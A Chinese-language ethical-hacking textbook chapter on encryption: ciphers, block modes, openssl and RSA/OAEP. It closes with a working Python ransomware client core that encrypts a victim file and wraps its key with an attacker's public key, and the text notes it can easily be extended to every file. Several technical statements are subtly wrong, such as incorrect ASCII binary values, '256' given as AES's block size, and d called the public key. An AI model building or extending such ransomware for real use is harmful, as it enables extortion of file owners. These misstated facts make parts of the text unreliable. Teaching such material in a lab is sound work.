## 第六章：加密与勒索病毒**

*除非你知道密码，否则它没有意义。*

–John Connolly, *《失落的事物之书》*

![image](img/common.jpg)

*勒索病毒*是一种恶意代码，通过加密计算机的文件来控制机器。一旦加密了文件，勒索病毒通常会显示一个窗口，要求支付赎金以换取解密文件。本章将向你展示黑客如何编写加密勒索病毒来敲诈公司。然而，在此之前，你必须先了解加密算法和安全通信的一般知识。阅读本章后，你应该能够使用块加密算法加密文件，使用公钥加密法发送加密邮件，并设计你自己的加密勒索病毒。

### 加密

想象一下，爱丽丝希望防止别人阅读她的日记，因此她将其锁进一个保险箱并保管好钥匙。在计算机系统中，类似于将日记放入保险箱的操作是通过某种系统化的方式*加密*数据。如果爱丽丝加密了她的日记，那么任何偷走它的人都会很难恢复其中的信息。密码学家将原始日记称为*明文*，因为每个人都可以清楚地看到里面的内容，而将加密后的日记称为*密文*。

*凯撒密码*是最早的加密算法之一。它通过将一个字母替换为另一个字母来加密消息。例如，字母*a*可能会被替换为*b*，字母*c*将被替换为字母*d*，依此类推。图 5-1 展示了一种可能的映射示例。

![image](img/ch05fig01.jpg)

*图 5-1：凯撒密码加密映射*

尝试使用图 5-1 中显示的映射来解密密文“dbu buubdl”。你应该能够轻松地恢复出“cat attack”这条消息。然而，除非解密者也知道这个映射，否则他们很难理解密文“dbu buubdl”所表达的原始明文信息。我们将这种映射称为*密钥*。在我们的例子中，密钥是 1，因为我们将字母在字母表中向后移了一位。

注意凯撒密码的一个弱点：如果消息中只能包含 26 个唯一字母，则只有 26 个可能的密钥。黑客可以仅仅尝试每个密钥，直到找到解锁消息的密钥。所有可能的密钥数量称为*密钥空间*。具有更大密钥空间的加密算法更安全，因为黑客必须测试更多的密钥。凯撒密码不安全，因为它的密钥空间太小。

最安全的加密算法使任何可能的映射具有相同的概率，从而创造出最大的密钥空间。一种称为*一次性密码本*的算法实现了这一点。

#### *一次性密码本*

一次性密码本算法通过计算消息和密钥之间的*异或（XOR）*来加密消息。异或是一种逻辑操作，当两个输入位不同时时输出 1，相同时输出 0。例如，1 XOR 0 = 1，而 1 XOR 1 = 0。 图 5-2 展示了使用密钥`po7suq`加密词语*SECRET*的例子。

![image](img/ch05fig02.jpg)

*图 5-2：使用密钥加密消息的过程*

首先，明文和密钥中的每个字母都使用 ASCII 映射转换为其二进制表示。*美国信息交换标准代码（ASCII）*是一种标准，将自然语言字符映射为二进制代码。例如，密钥`po7suq`中的字符映射如下：p = 0111000, o = 01101111, 7 = 00110111, s = 0110011, u = 001110101, q = 00111001。接下来，两个二进制值进行异或运算并转换回 ASCII，结果是字符串`#*T!0%`。

为了更好地理解这一点，我们来考虑用密钥*p*对*S*进行加密的过程。我们将字符*S*和*p*转换为它们各自的二进制表示，分别是 01010011 和 01110000，然后计算*S*和*p*中每一对二进制位的异或（XOR），从左到右进行。这意味着我们将 0 与 0 异或，1 与 1 异或，依此类推，直到最后一对 1 与 0 异或。得到的结果是 00100011，当转换回 ASCII 时，得到的密文是#。

除非攻击者知道密钥，否则他们不可能恢复原始消息。这是因为一次性密码本算法确保任何可能的映射都是等概率的。密文中的每个 0 或 1 都有相同的概率是明文中的 0 或 1，前提是你随机选择了密钥中的值。密文值 00 同样可能映射到明文值 11、10、01 或 00。这意味着一个*n*位的明文有 2*^n*种可能的密文值。因此，我们 48 位的明文`SECRET`有 281 万亿种可能的映射。现在，这就是一个庞大的密钥空间。

一次性密码本确实会泄露一些信息。在这种情况下，我们知道密文、密钥和原始消息的长度都是六个字符。然而，考虑到密文有可能与词语*SECRET*一样，也有可能与其他六个字符的词语（如*puzzle*、*quacks*或*hazmat*）对应，这并不会告诉我们太多信息。这是因为我们可以选择一个六个字符的密钥，将这些词语中的任何一个映射到密文。要解密消息，你需要再次将密文与密钥进行异或操作。

**一次性密码本背后的数学**

为了更好地理解一次性密钥算法是如何工作的，以及相同的操作如何既能加密又能解密数据，考虑一下背后的代数原理。我们首先引入一些符号。让 *E*(*k*, *m*) 表示通过将消息 *m* 与密钥 *k* 进行 XOR 运算来加密消息 *m* 的函数。我们将使用符号 *⊕* 来表示 XOR 运算，并让 *c* 表示密文。以下方程式用数学语言表达了这些思想：

*E*(*k*, *m*) = *m* ⊕ *k* = *c*

*D*(*c*, *k*) 是通过将密文 *c* 与相同的密钥 *k* 进行 XOR 运算来解密密文的函数。如果你看一下加密方程式，你会发现我们可以将 (*m* ⊕ *k*) 代替密文 *c*，从而得到以下结果：

*D*(*k*, *c*) = *c* ⊕ *k* = (*m* ⊕ *k*) ⊕ *k*

XOR 运算符是结合的，这意味着运算的顺序不影响结果。所以我们可以重新排列括号，并将方程式的右边改写如下：

(*m* ⊕ *k*) ⊕ *k* = *m* ⊕ (*k* ⊕ *k*)

XOR 运算符还是自反的，这意味着如果我们将一个数字与它自身进行 XOR 运算，结果将是 0。这就给出了以下结果：

*m* ⊕ (*k* ⊕ *k*) = *m* ⊕ (0)

XOR 运算符还遵循恒等元素的性质，这意味着将一个数字与 0 进行 XOR 运算会直接返回该数字。

*m* ⊕ (0) = *m*

通过前面的步骤，我已经证明了通过将密文与密钥进行 XOR 运算，可以解密出原始消息：

*D*(*k*, *c*) = *c* ⊕ *k* = (*m* ⊕ *k*) ⊕ *k* = *m*

一次性密钥算法有两个局限性。首先，每个密钥只能使用一次。如果相同的密钥被使用多次，黑客就可以通过将两个密文进行 XOR 运算来发现关于消息的信息。例如，在 图 5-3 中，你可以看到将蜜蜂和停止密码进行 XOR 运算等同于对两个明文消息进行 XOR 运算。

![image](img/ch05fig03.jpg)

*图 5-3：黑客如何从使用相同密钥加密的两条消息中恢复信息*

以下方程式在代数上概述了，将使用相同密钥 *k* 加密的两个密文 (*c*[1] 和 *c*[2]) 进行 XOR 运算如何等价于对两个明文消息 *m*[1] 和 *m*[2] 进行 XOR 运算。自反特性（如框中所述）使得两个密文中的密钥相互抵消：

*c*[1] ⊕ *c*[2] *⇒* (*m*[1] ⊕ *k*) ⊕ (*m*[2] ⊕ *k*) *⇒* (*m*[1] ⊕ *m*[2]) ⊕ (*k* ⊕ *k*) *⇒* (*m*[1] ⊕ *m*[2])

换句话说，当我们对两个密文进行 XOR 运算时，密钥提供的随机信息就消失了。此外，使用相同的密钥加密相同的消息总会得到相同的密文。这使得黑客能够检测到相同的消息被发送了两次。

密钥的长度还必须与消息长度相同；因此，长消息需要长密钥。这意味着，要加密一篇 250 字的文档，假设平均每个单词五个字符，你就需要记住一个 1,250 个字符长的密钥。

如果你可以将较短的密钥（例如`tfkd`）转换为较长的密钥（如`qwedfagberw`），那么你就可以用较短的密钥来加密长消息。恰巧的是，我们可以通过使用伪随机生成器来实现这一点。

#### *伪随机生成器*

*伪随机生成器（PRG）*是一种算法，它在给定相同密钥的情况下总是生成相同的看似随机的输出。这使得你可以使用较短的密码来创建一个与消息长度相同的密钥，而无需记住整个密钥。关于随机性的讨论总是很棘手。PRG 的结果看起来*统计上*是随机的，尽管它们并不是从像大气噪声或放射性衰变这样的随机源中抽样的。然而，它们不可能是真正统计上的随机，因为 PRG 的输入远小于其输出。尽管如此，没有有效的算法能够区分它们，因此 PRG 的输出可以和统计均匀的字符串一样好。

如何从一个短的密钥反复生成相同的伪随机数序列？一种方法是使用*线性同余* *生成器（LCG）*。这个公式的细节并不重要，但如果你感兴趣，下面的方程式描述了它。在这里，*X[n]*代表序列中的第*n*个数字：

*X[n]*[+1] = (*aX[n]* + *c*) mod *m*

根据序列的长度，你可以为*a*、*c*和*m*选择不同的值。你还可以选择序列中的第一个数字，*X*[0]，它被称为*种子*。考虑一个参数为*m* = 9，*a* = 2，*c* = 0，种子为 1（即*X*[0] = 1）的情况。这些参数产生以下输出：2, 4, 8, 7, 5, 1。 表 5-1 展示了如何计算序列中的每个数字。

**表 5-1：** LCG 如何计算伪随机序列中的数字

| ***X****[n+1]*** | (***aX****[n]** **+ c)*** mod ***m*** | ***X****[n]*** |
| --- | --- | --- |
| 2 | 2 *** 1 + 0 mod 9 | 1 |
| 4 | 2 *** 2 + 0 mod 9 | 2 |
| 8 | 2 *** 4 + 0 mod 9 | 4 |
| 7 | 2 *** 8 + 0 mod 9 | 8 |
| 5 | 2 *** 7 + 0 mod 9 | 7 |
| 1 | 2 *** 5 + 0 mod 9 | 5 |
| 2 | 2 *** 1 + 0 mod 9 | 1 |

这个序列不是无限的，因为它会重复。你可以通过仔细选择参数来生成更长的序列；然而，所有序列最终都会回到起点。通过从短密钥生成更长密钥的这个过程称为*密钥派生*。

在周期重复之前的序列长度称为它的*周期*。重复性并不是 LCGs 唯一的问题。例如，一个具有极大周期的 LCG 仍然不安全。另一个问题是这些值是可预测的（即使不计算完整的周期）。你永远不应该在加密应用中使用 LCG 算法。我们建议你在需要推导密钥时使用*基于密码的密钥派生函数 2（PBKDF2）*。

#### *不安全的分组密码模式*

如果我们不是生成与消息长度相同的密钥，而是将消息拆分成多个块呢？那么我们就可以使用更短的密钥独立加密每个大文件的块。这就是*块密码模式*的核心思想。*电子密码本（ECB）*密码模式是最早的一种，虽然它不安全，但它很好地展示了这个概念。

图 5-4 展示了 ECB 如何加密二进制序列`00011011`。请注意，二进制序列被分成四个块，每个块都并行加密。

![image](img/ch05fig04.jpg)

*图 5-4：ECB 块密码模式加密二进制序列* `*00011011*`

在这个例子中，块执行一个简单的函数，将输入与密钥 01 进行异或。然而，在给定相同的密钥和输入的情况下，ECB 总是输出相同的密文，泄露信息给黑客。ECB 还为每个块重复使用密钥，这减少了可能的结果数量，使黑客更容易解密消息。例如，图 5-5 展示了一张被 ECB 加密的图片。

![image](img/ch05fig05.jpg)

*图 5-5：左侧的图片是原始图片，而右侧的图片是加密后的图片。*

请注意，在加密后的文件中，你仍然能看到原子轮廓。这是由于每个块使用相同的密钥而导致的信息泄露。如果使用 ECB 模式加密文本，也会泄露相似量的信息。

凯撒密码、一次性密钥和电子密码本（ECB）模式的微小缺陷应该能够说明为什么你永远不应该自己实现加密算法。加密非常精密，稍微偏离规范就可能导致不安全的实现。总是使用来自受信任库的安全算法。

#### *安全块密码模式*

让我们来看看一个更好的加密算法。图 5-6 展示了*计数器模式块密码（CTR）*的设计。

![image](img/ch05fig06.jpg)

*图 5-6：CTR 设计*

CTR 克服了 ECB 的两个局限性。首先，CTR 生成一个随机数，称为*nonce*（一次性使用的数字），它用这个数在每次加密文件时创建唯一的密钥。然后，它将 nonce 附加到一个计数器上，该计数器唯一标识每个块，然后将其发送到块中。这确保了每个块接收到唯一的信息。

让我们考虑一个例子。我们将使用一个 1 位计数器和一个 1 位随机数值为 0。计数器将在 0 和 1 之间循环。当它附加到随机数的末尾时，这将产生以下输入：00 和 01。随机数和计数器的组合被送入每个块，返回一个块特定的填充。为了加密块，我们将此块特定的填充与该块的明文进行异或操作，从而生成最终的密文。图 5-7 显示了使用具有 1 位计数器{0,1} 和 1 位随机数（抛硬币正面：1，反面：0）的 CTR 加密二进制序列 0000 的示例。

![image](img/ch05fig07.jpg)

*图 5-7：使用 CTR 和 1 位计数器以及 1 位随机数加密二进制序列* `*0000*`

本示例中的块使用与 图 5-6 中显示的相同的密钥和映射。

区分块密码和块密码操作模式非常重要。块密码是一种带密钥的函数，它接受一个 *n* 位的块，并输出一个 *n* 位的块。一个安全的块密码的输出看起来像是输入块的随机排列。尽管我们在示例中使用的是 XOR 函数，但 NSA 推荐使用 *高级加密标准 (AES)* 密码。

块密码本身不是加密方案；然而，你可以将它们用于不同的“模式”来获得加密方案。ECB 和 CTR 就是操作模式的例子。当我们说 ECB 不安全时，指的是模式本身被破坏，而不是底层的块密码。

### 加密和解密文件

让我们使用 CTR 密码来加密一个文件。首先，在 Kali Linux 虚拟机上打开终端。通过运行以下命令创建一个包含消息“Top Secret Code”的文本文件：

```
kali@kali:~$ echo "Top Secret Code" > plain.txt
```

要查看文件的内容，运行 `cat` 命令：

```
kali@kali:~$ cat plain.txt
```

我们将使用 `openssl` 库，它包括多个加密算法，并预装在 Kali Linux 中。通过运行以下命令并在提示时输入密码来加密文件：

```
kali@kali:~$ openssl enc -aes-256-ctr -pbkdf2 -e -a -in plain.txt -out encrypted.txt
```

`enc -aes-256-ctr` 标志表示你想要使用 *aes-256-ctr* 块密码。块密码的名称分为三个部分。第一部分（`aes`）表示每个块中使用的映射函数，在这种情况下是之前提到的 AES 密码。接下来的部分（`256`）表示块大小，在此例中是 256 位。最后一部分（`ctr`）表示一个 CTR 块密码模式。下一个选项 `-pbkdf2` 表示密钥派生函数，`-e` 标志告诉 `openssl` 对文件进行加密。`-a` 标志以 Base64 编码输出加密文件，而不是二进制文件，这将使我们更容易在终端中打印加密文件。最后，我们使用 `-in` 和 `-out` 选项来指定要加密的文件和输出文件的名称。

要查看加密文件的内容，使用 `cat` 命令：

```
kali@kali:~$ cat encrypted.txt
```

要解密文件，运行以下命令：

```
kali@kali:~$ openssl enc -aes-256-ctr -pbkdf2 -d -a -in encrypted.txt -out decrypted.txt
```

`-d` 标志指示 `openssl` 解密文件。请输入您之前使用的密码。像一次性密码本算法一样，CTR 通过将密文与由块输出的密钥进行异或操作来解密，从而逆转加密过程。

请注意，窃取该加密文件的黑客可能无法解密它，但他们仍然可以通过更改加密的位来破坏它。在第六章中，我们将讨论一种加密算法，它允许您共享加密文件并检测已损坏的副本。

### 电子邮件加密

现在您已经加密并解密了一个文件，让我们来解决如何在公共网络上发送加密邮件的问题，在这种情况下，您应该假设任何人都可以读取您发送的未加密信息。乍一看，解决这个问题似乎并不难。您可以创建一个密钥并通过公共网络发送加密消息，这样拦截该消息的人就无法读取它。

然而，您的收件人也无法读取这条消息，因为他们没有密钥。假设你们永远不会面对面交换密钥，那么如何将密钥传递给收件人而不被截获呢？您可以使用一种叫做*公钥加密*的技术，也叫做*非对称加密*。

#### *公钥加密*

公钥加密与传统的共享密钥不同，它使用两把密钥：一把公钥，任何人都可以看到，一把私钥，永远不会共享。这两把密钥在数学上是相互关联的，因此，使用公钥加密的消息只能通过使用私钥解密，反之亦然。

为了了解公钥加密如何在发送消息时发挥作用，我们可以考虑一个类比。如果您想通过邮件将日记发送给爱丽丝，但又不希望邮件系统中的任何人能够阅读它，您该怎么办？您可以将日记放入盒子并锁住，然后发送给爱丽丝，但爱丽丝无法打开这个盒子，因为她没有钥匙。相反，如果爱丽丝先发送给您一个开锁的锁并保留钥匙呢？这个锁并不保护任何机密信息，所以即使公共邮件系统中的每个人都能看到它也没关系。

您可以把这个锁想象成爱丽丝的公钥。现在，您可以使用爱丽丝给您的锁把日记锁在盒子里，并通过邮寄的方式将其送到爱丽丝手中。邮件系统中的任何人都无法打开您的盒子（甚至您也不能！），因为只有爱丽丝拥有密钥。当爱丽丝收到盒子时，她会用她的私钥解锁它。

实际的公钥与锁有些不同，因为它们既可以加密（像锁一样）也可以解密（像钥匙一样）。私钥也是如此。如果一条消息使用公钥加密，只有拥有私钥的人才能解密它。但如果一条消息使用私钥加密，任何拥有公钥的人都可以解密它。

一开始，可能不太明显为什么有人会用自己的私钥加密信息，因为任何拥有你公钥的人都可以解密消息。但用私钥加密消息可以向他人保证消息确实来自你，因为只有你能访问你的私钥。用私钥加密消息的过程通常被称为*签名*。通过签署消息，你保证消息确实来自你。例如，当你请求银行的网页时，银行的服务器会提供一个签名证书，证明其真实性。我们将在第六章中详细讨论这个话题。

让我们看一下使得公钥加密技术成为可能的算法之一：里维斯–沙米尔–阿德尔曼。

#### *里维斯–沙米尔–阿德尔曼理论*

公钥加密技术并不是通过随机生成一个密钥，而是通过计算生成两个密钥之间的关系。让我们使用一些数学符号来帮助讨论*里维斯–沙米尔–阿德尔曼 (RSA)*算法。我们将用整数*e*表示公钥，用于加密，整数*d*表示私钥，用于解密。（这些变量是在首次介绍 RSA 的论文中使用的。）在讨论如何生成这些密钥之前，我们将先介绍加密和解密过程。

我们可以将消息*m*表示为二进制，这些二进制值可以解释为十进制数字。例如，ASCII 字符*A*对应的二进制值是 1000001，它可以解释为整数 65。我们现在可以通过定义一个函数将 65 映射到一个新的密文值*c*来加密值 65。以下方程定义了加密函数：

*E*(*e*, *m*, *n*) = *m^e* mod *n* ≡ *c*

这个加密方程引入了一个新的公共参数*n*。这个参数是在密钥生成过程中创建的，我们稍后会讨论它。

你也许会想，为什么黑客不能通过计算![image](img/077equ01.jpg)来解密消息。这对于大数值的*m*和*e*来说是很难计算的，而且还因为必须考虑模*n*操作，使得这一过程更加复杂。那么，爱丽丝如何解密消息呢？公钥（*e*）和私钥（*d*）的设计是这样的，如果你将密文提高到私钥*d*的值并计算模数，你将得到原始消息。（我们通常将这些特性称为*陷门*。）

#### *RSA 数学*

让我们解释一下这一切是如何工作的。我们首先用数学的方式表达解密过程：

*D*(*d*, *c*, *n*) = *c^d* mod *n* ≡ *m*

如果我们将加密方程中* c*的表达式代入解密方程，我们可以重写解密方程，使其包含公钥和私钥（*e*, *d*）以及生成的参数（*n*）：

(*m^e* mod *n*)*^d* mod *n* ≡ *m*

然后我们可以使用以下数学属性简化方程：

(*a* mod *n*)*^d* mod *n* ≡ *a^d* mod *n*

这允许我们将其改写为：

*m^(ed)* mod *n* ≡ *m*

现在，如果我们能够选择 *e*、*d* 的值，使得 *m* 的系数为 1，那么就可以证明对于所有小于 *n* 的 *m*，都有 *m^(ed)* mod *n* = *m*，如下面的方程所示：

*m^(ed)* mod *n* ≡ *m*¹ mod *n* ≡ *m*

如果我们将整数 *e* 和 *d* 都设为 1，那么这个等式就成立。但我们如何改写这个方程，使其在其他值下也成立呢？考虑以下属性，对于任何 *x* 和 *y* 的值，当 *n* 是两个质数的乘积时：*p*, *q* 和 *z* = (*p* – 1)(*q* – 1)，该属性成立：

*x^y* mod *n* ≡ *x*^((*y* mod *z*)) mod *n*

如果我们使用这个属性重新写上面的方程，我们得到以下结果：

*m*^((*ed* mod *z*)) mod *n* ≡ *m*

现在我们可以使用 1 以外的整数值作为 *e* 和 *d*，只要我们确保 *ed* mod *z* = 1。

但是我们如何通过编程方法发现 *e* 和 *d* 的整数值呢？密钥生成算法允许我们为 *e*、*d* 和 *n* 生成合适的整数值。密钥生成算法由四个关键步骤组成：

1\. 选择两个大的质数 (*p*, *q*) 并保持它们的秘密。

2\. 计算 *n* = *pq* 和 *z* = (*p* – 1)(*q* – 1)。

3\. 通过选择一个小于 *n* 且与 *z* 相对素的整数来计算公钥 (*e*)，这意味着它与 *z* 没有共同的因子。算法通常选择值 65,537。

4\. 使用 *扩展欧几里得* 算法计算公钥 (*d*)，方法是选择一个整数 *d* 使得 *ed* mod *z* = 1。

现在你得到了 *e*、*d* 和 *n* 的值。

到目前为止，我们只关注了 RSA 算法。但安全的 RSA 实现还必须使用 *最优非对称加密填充 (OAEP)* 算法。为了简单起见，我推迟了对 OAEP 算法的讨论，并将在本章稍后进行介绍。但不用担心，当使用 `openssl` 对文件进行加密和解密时，我们会包含 `-oaep` 标志，因此这里显示的命令应该是安全的。

### 使用 RSA 加密文件

现在你已经了解了 RSA 背后的理论，让我们使用 `openssl` 库生成一个加密的电子邮件。首先，运行以下命令生成一对公钥和私钥：

```
kali@kali:~$ openssl genrsa -out pub_priv_pair.key 1024
```

`genrsa` 标志告诉 `openssl` 你想要生成一个 RSA 密钥，`-out` 标志指定输出文件的名称，值 `1024` 表示密钥的长度。更长的密钥更安全。NSA 推荐使用 3,072 位或更长的 RSA 密钥。记住：不要与任何人分享你的私钥。你可以通过运行以下命令查看你生成的密钥对：

```
kali@kali:~$ openssl rsa -text -in pub_priv_pair.key
```

`rsa` 标志告诉 `openssl` 将密钥视为 RSA 密钥，`-text` 标志以人类可读的格式显示密钥。你应该看到类似以下内容的输出：

```
 RSA Private-Key: (1024 bit, 2 primes)
modulus:

    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:

    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:

    .....
publicExponent: 65537 (0x10001)
privateExponent:

    73:94:01:5c:7a:4d:6c:36:0f:6c:14:8e:be:6d:ac:

    a6:7e:1b:c0:77:28:d4:8d:3e:ac:d0:c1:d5:8e:d0:

    .....
prime1:

    00:dc:15:15:14:47:31:75:5d:37:33:57:e0:86:f7:

    7d:2e:70:79:05:e1:e0:50:2f:20:46:60:e0:47:bf:

    .....
prime2:

    00:d7:d4:84:90:34:d9:2f:b2:52:54:a0:a9:28:fd:

    2a:95:fd:67:b7:81:05:69:82:12:96:63:2c:14:26:

    .....

................
writing RSA key

-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQC5jGggVL7NzC/ZMfDhbn68yUMfMPczM/Z0uW/R2YU5/KtRxPtK

9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvkU3vephDzkpeLpqPuM7TAqeOH

                    ..........

                    ..........
esvJa46Lzn6bvi3LxQJAF3aKgNy4mDpTGYAud381P9d8qCxHRQMaCZ43MPLnD22q
rf52xkSr0A6I2cJDp4KvF1EvIH8Ca2HlUrKWmCi57g==

-----END RSA PRIVATE KEY-----
```

该输出中的标签对应于我们在本章前面讨论的理论，模数是值 *n*。记住，这就是两个质因子 *p* 和 *q* 的乘积，它们在输出中被标记为 prime1 和 prime2。公钥指数（公钥）是值 *e*，而私钥指数（私钥）是值 *d*。底部的部分代表了公私钥对的 Base64 编码版本，其中包含了所有组件。

你可以通过运行以下命令从这个文件中提取公钥：

```
kali@kali:~$ openssl rsa -in pub_priv_pair.key  -pubout -out public_key.key
```

`-pubout` 标志告诉 `openssl` 从文件中提取公钥。你可以通过运行以下命令查看公钥，其中 `-pubin` 标志指示 `openssl` 将输入视为公钥：

```
kali@kali:~$ openssl rsa  -text -pubin -in public_key.key

RSA Public-Key: (1024 bit)
Modulus:

    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:

    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:

    .....
Exponent: 65537 (0x10001)
writing RSA key

-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5jGggVL7NzC/ZMfDhbn68yUMf
MPczM/Z0uW/R2YU5/KtRxPtK9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvk
U3vephDzkpeLpqPuM7TAqeOHdtbmLGM5edQNmuO3Iw/VrkISQKfPp00zfcnQ4Db4
sROIQ+sQzQv4Q7Q2bwIDAQAB

-----END PUBLIC KEY-----
```

你可以通过将公钥发布在你的网站上来使其可用。请注意，公钥也包括了解密所需的模数 *n*。因为 *n* 是两个秘密质数（*p* 和 *q*）的乘积，如果黑客能够因式分解 *n*，他们就可以解密 RSA 密文。然而，目前没有经典算法能够有效地因式分解 *n*，如果质数较大。1994 年，彼得·肖尔提出了一种 *量子算法*，可以因式分解大数。该算法是有效的，但我们还无法创造出能够在大数上运行的量子计算机。在我们拥有强大的量子计算机之前，RSA 仍然是一个安全的加密形式。

是时候使用你新的公钥和私钥了。创建一个文本文件进行加密：

```
kali@kali:~$ echo "The cat is alive" > plain.txt
```

使用 RSA 工具（`rsautl`），这是 `openssl` 的一部分，创建一个加密的二进制文件（*cipher.bin*）：

```
kali@kali:~$ openssl rsautl -encrypt -pubin -inkey public_key.key -in plain.

			![image](img/arrow01.jpg) txt -out cipher.bin -oaep
```

请注意，我们包括了 `-oaep` 标志。RSA 的安全实现必须使用在下一节中讨论的 OAEP 算法。每当你使用 `openssl` 进行加密和解密文件时，务必应用此标志以确保操作安全。

通过运行以下命令将二进制文件转换为 Base64：

```
kali@kali:~$ openssl base64 -in cipher.bin -out cipher64.txt
```

将文件从二进制转换为 Base64 编码可以让你将其作为文本粘贴到电子邮件中。你可以使用 `cat` 命令查看 Base64 编码后的文本：

```
kali@kali:~$ cat cipher64.txt
MAmugbm6FFNEE7+UiFTZ/b8Xn4prqHZPrKYK4IS2E31SHhKWFjjIfzXOB+sFBWBz
ZSoRpeGZ8tSj7vs/pkO/kNCDxRxelfipdOhiigFk6TqAl9JwyB5E76Bm+Ju+sMat
h0Dx6tBjiN4RhT1hRl+9rUxdYk+IziH0jkCCngH6m5g=
```

将文件进行 Base64 编码并不是真正的加密；它仅仅是格式化文件。总是先加密文件，再进行 Base64 编码。通过将 Base64 文本转换回二进制来解密消息：

```
kali@kali:~$ openssl base64 -d -in cipher64.txt -out cipher64.bin
```

然后，使用以下命令解密该二进制文件：

```
kali@kali:~$ openssl rsautl -decrypt -inkey pub_priv_pair.key -in cipher64.bin

			 -out plainD.txt -oaep
```

最后，你可以使用 `cat` 命令查看解密后的消息：

```
kali@kali:~$ cat plainD.txt
```

你应该能看到原始消息：猫还活着。

#### *最佳非对称加密填充*

纯 RSA 并不安全，因为在使用相同公钥 *e* 加密时，消息总是会生成相同的密文。这是因为加密过程（*m^e* mod *n*）不包括随机数 nonce，除此之外还有其他弱点。OAEP 预处理和后处理步骤解决了这些问题。

让我们来看一下 OAEP 算法，略去一些数学细节。在消息加密之前，它首先会经过 OAEP 预处理步骤：

*E*(*e*, *m*, *n*) = (OAEP-PRE(*m*))*^e* mod *n* ≡ *c*

你可以使用以下伪代码表示此步骤：

```
OAEP-pre(m):

    r = random_nonce()

 ➊ X = pad(m) XOR Hash(r)

    Y = r XOR Hash(X)

    return X ∥ Y
```

`pad()`函数 ➊ 通过在其位表示的末尾添加零使得 *m* 成为一个更大的数字，而`Hash()`代表哈希函数，如 SHA-256。为什么我们需要把 *m* 变成一个大数字？如果 *m^e* 很小，加密函数 *m^e* mod *n* 就无法使用模运算，并且计算![image](img/077equ01.jpg)就变得容易了。OAEP 是一种填充算法，确保小数字被转换为使用模运算的大数字。

OEAP 后处理步骤恢复原始消息，并可以使用以下伪代码表示：

```
OAEP-post(m'):

    split m'into X and Y

    R = Y XOR Hash(X)

    m_padded = X XOR HASH(R)

    return remove_padding(m)
```

因为这些加密过程非常精细，如果黑客发现软件开发人员或系统管理员使用这些加密算法时存在漏洞，他们很容易破解加密。例如，如果程序员在预处理时使用了 PKCS1 版本 1.5 而不是 OAEP，黑客就能解密密文。因此，当试图破解加密消息时，攻击者应该首先检查加密消息时使用的选项。

现在，让我们将这些想法结合起来，实现一些更酷的东西：勒索软件。

### 编写勒索软件

第一代勒索软件系统使用对称密钥加密，并将密钥存储在勒索软件本身中，这使得安全研究人员能够提取密钥。现代勒索软件系统使用混合方法。它们仍然使用随机对称密钥来加密受害者机器上的文件，但为了防止安全研究人员提取密钥，它们会用黑客的公钥加密对称密钥。图 5-8 显示了这个过程的概览。

如果受害者支付赎金，通常通过上传比特币和加密的对称密钥副本，勒索软件服务器将使用黑客的私钥解密对称密钥并将其返回给受害者。受害者使用此密钥解密文件。

![image](img/ch05fig08.jpg)

*图 5-8：勒索软件如何通过使用黑客的公钥加密对称密钥来保护它*

当然，攻击者可以接受支付并忽略受害者，既不解密文件，也不发送密钥。一旦受害者支付了赎金，攻击者从解密过程中的参与中几乎没有任何收获。

在本节中，我们将编写自己的 Python 勒索病毒客户端。为了避免加密 Kali Linux 虚拟机上的所有文件，我们将限制勒索病毒客户端仅加密一个文件。然而，你可以轻松地扩展实现，使其加密受害者计算机上的每个文件。首先，我们将生成一个随机的对称密钥，然后使用该密钥加密文件。文件加密后，我们将使用公钥加密对称密钥，并将其保存到 Kali Linux 机器上的一个文件中。当程序终止时，它将删除对称密钥。

我们将使用 Python 加密权威机构推荐的 pyca`/cryptography`库。通过运行以下命令安装该库：

```
kali@kali:~$ pip3 install cryptography
```

安装库后，打开一个文本编辑器，如 Mousepad，并输入以下内容：

```
   from cryptography.hazmat.backends import default_backend

   from cryptography.hazmat.primitives import serialization

   from cryptography.hazmat.primitives.asymmetric import padding

   from cryptography.hazmat.primitives import hashes

   from cryptography.fernet import Fernet

➊ symmetricKey  = Fernet.generate_key()

   FernetInstance = Fernet(symmetricKey)

➋ with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:

       public_key = serialization.load_pem_public_key(

           key_file.read(),

           backend=default_backend()

        )

   encryptedSymmetricKey = public_key.encrypt(

       symmetricKey,

    ➌ padding.OAEP(

           mgf=padding.MGF1(algorithm=hashes.SHA256()),

        ➍ algorithm=hashes.SHA256(),

           label=None

       )

   )

➎ with open("encryptedSymmertricKey.key", "wb") as key_file:

           key_file.write(encryptedSymmetricKey)

   filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"

   with open(filePath, "rb") as file:

       file_data = file.read()

    ➏ encrypted_data = FernetInstance.encrypt(file_data)

   with open(filePath, "wb") as file:

       file.write(encrypted_data)

   quit()
```

`Fernet`模块 ➊ 提供了一个简单的 API，用于执行对称密钥加密。我们通过使用`with`关键字 ➋ 从文件加载公钥，这比 Python 的`try finally`关键字更好，因为它隐式地管理资源。为了说明这一点，考虑以下示例。第一个示例使用`try`和`finally`关键字打开、编辑和关闭文件：

```
myFile = open('output.txt', 'w')
try:

    myFile.write('hello world!')
finally:

    myFile.close()
```

相比之下，第二个示例使用`with`关键字来隐式地管理资源，从而产生更简洁、更易读的代码，如下所示：

```
with open('output.txt', 'w') as myFile:

    myFile.write('hello world!')
```

然后我们使用了 OAEP 算法 ➌。由于 OAEP 内部依赖于加密哈希函数，我们必须选择一个来使用。这里我们选择了 SHA256 哈希算法 ➍。

接下来，我们将加密密钥写入内存中的文件 ➎ 然后加密该文件 ➏。程序终止时，明文对称密钥将从计算机内存中删除。

